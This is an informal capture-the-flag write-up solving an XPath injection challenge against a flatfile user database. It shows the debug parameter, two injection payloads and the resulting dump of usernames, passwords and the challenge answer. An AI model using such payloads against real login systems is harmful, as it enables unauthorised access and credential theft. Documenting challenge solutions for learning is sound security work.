Drake has been experimenting with flatfile databases, as he has never had any success with MySQL. 
But alas, more problems. Try and find the answer

in page source we have for dubugging process put ?debug=true
    Query was: /users/user[username='jayesh']/username | /users/user[password='8fvDV3ZHWM.3!dG']/password
    Array()

now we can actually see the query
so this time we put ' or '1'='1 we get :
    Array ( [0] => SimpleXMLElement Object ( [0] => XpAtHaDmIn ) [1] => SimpleXMLElement Object 
    ( [0] => system ) [2] => SimpleXMLElement Object ( [0] => moshbat ) )
but in the video they saw 3 more field

swwning the syntax of the query i insert

']|/* | /anything[anything='

we get:
    Query was: /users/user[username='']|/* | /anything[anything='']/username 
    | /users/user[password='']|/* | /anything[anything='']/password

    Array
    (
    [0] => SimpleXMLElement Object
        (
            [user] => Array
                (
                    [0] => SimpleXMLElement Object
                        (
                            [id] => 1
                            [username] => XpAtHaDmIn
                            [password] => z0mgXPATH!
                            [answer] => You've successfully injected an XPath login, the password is: IloveXPath!
                        )

                    [1] => SimpleXMLElement Object
                        (
                            [id] => 2
                            [username] => system
                            [password] => elites0ft.com
                            [answer] => You won't find the answer here.
                        )

                    [2] => SimpleXMLElement Object
                        (
                            [id] => 3
                            [username] => moshbat
                            [password] => systemisbetter
                            [answer] => You won't find the answer here.
                        )

                )

        )
